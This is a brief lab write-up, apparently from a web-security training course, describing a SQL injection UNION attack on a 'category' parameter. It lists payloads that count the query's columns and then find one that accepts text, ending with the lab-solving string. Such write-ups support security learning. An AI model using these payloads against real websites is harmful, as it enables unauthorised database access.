# Lab 4 - SQL injection UNION attack, finding a column containing text

**Status**: Solved the 1st August 2023.

**Objective**: Identify a column compatible with string data, and return the provided value in there.

## Solving Process

- As happened in the last labs, the vulnerable parameter is `category`, so the payload will be injected in there as well.
- The first step is to find how many columns does the original query has, for that let's try this payload `'+UNION+SELECT+NULL--` and add `NULL` until there's no error message returned.
  - 1 col: `'+UNION+SELECT+NULL--`, returns an error.
  - 2 cols: `'+UNION+SELECT+NULL,NULL--`, returns and error.
  - 3 cols: `'+UNION+SELECT+NULL,NULL,NULL--`, returns *no error*.
- The number of columns is 3.
- Now let's find which columns allow strings, by changing the `NULL` with a string in each position, until we get no errors at all in the response.
  - 1st col: `'+UNION+SELECT+'abc',NULL,NULL--`, returns an error.
  - 2nd col: `'+UNION+SELECT+NULL,'abc',NULL--`, returns *no error*.
  - The second column accepts strings
- To return the provided value `'6scgin'`, simply replace the test string with the right one.
  - `'+UNION+SELECT+NULL,'6scgin',NULL--` solves the lab!
